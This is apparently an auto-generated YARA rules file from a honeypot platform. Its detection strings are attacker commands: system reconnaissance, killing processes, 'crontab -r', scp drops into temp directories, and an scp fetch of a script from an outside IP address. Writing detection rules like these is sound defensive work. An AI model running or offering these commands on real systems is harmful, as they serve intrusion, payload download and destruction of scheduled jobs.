// LLM Honeypot Intelligence Platform - YARA Rules
// Generated: 20260614_1458
// Source: Elasticsearch honeypot data (24h window)

rule Honeypot_SystemRecon {
    meta:
        description = "LLM Honeypot Intelligence - SystemRecon pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-06-14"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "2502"
        unique_patterns = "12"
    strings:
        $s0 = "ps aux" ascii nocase
        $s1 = "uname -s -v -n -m 2>/dev/null" ascii nocase
        $s2 = "nproc" ascii nocase
        $s3 = "lscpu" ascii nocase
        $s4 = "uname -n" ascii nocase
        $s5 = "grep -c \"^processor\" /proc/cpuinfo 2>/dev/null" ascii nocase
        $s6 = "kill -9 $pid 2>/dev/null" ascii nocase
        $s7 = "gpu_info=$( (lspci 2>/dev/null" ascii nocase
        $s8 = "cat --help 2>&1" ascii nocase
        $s9 = "grep -i nvidia) 2>/dev/null" ascii nocase
        $s10 = "echo \"UNAME:$uname" ascii nocase
        $s11 = "uname -m" ascii nocase
    condition:
        any of them
}

rule Honeypot_Persistence {
    meta:
        description = "LLM Honeypot Intelligence - Persistence pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-06-14"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "12"
        unique_patterns = "1"
    strings:
        $s0 = "crontab -r" ascii nocase
    condition:
        any of them
}

rule Honeypot_ToolDownload {
    meta:
        description = "LLM Honeypot Intelligence - ToolDownload pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-06-14"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "117"
        unique_patterns = "12"
    strings:
        $s0 = "curl ipinfo.io/org" ascii nocase
        $s1 = "scp -qt \"/dev/shm/GnHyjver" ascii nocase
        $s2 = "scp -qt \"/dev/shm/ePZBBbBI" ascii nocase
        $s3 = "scp -qt \"/tmp/lKxXPpzx" ascii nocase
        $s4 = "scp -t /usr/local/bin/dms55c76xpps2yz3u0j18tgwhu" ascii nocase
        $s5 = "scp -qt \"/dev/shm/PlRKnTbE" ascii nocase
        $s6 = "scp -qt \"/tmp/wDNCJKjh" ascii nocase
        $s7 = "scp -qt \"/var/tmp/YzuvpyqM" ascii nocase
        $s8 = "scp -qt \"/var/tmp/wDNCJKjh" ascii nocase
        $s9 = "scp -t ~/dms55c76xpps2yz3u0j18tgwhu" ascii nocase
        $s10 = "scp -qt \"/var/tmp/DNqgjaNK" ascii nocase
        $s11 = "scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh" ascii nocase
    condition:
        any of them
}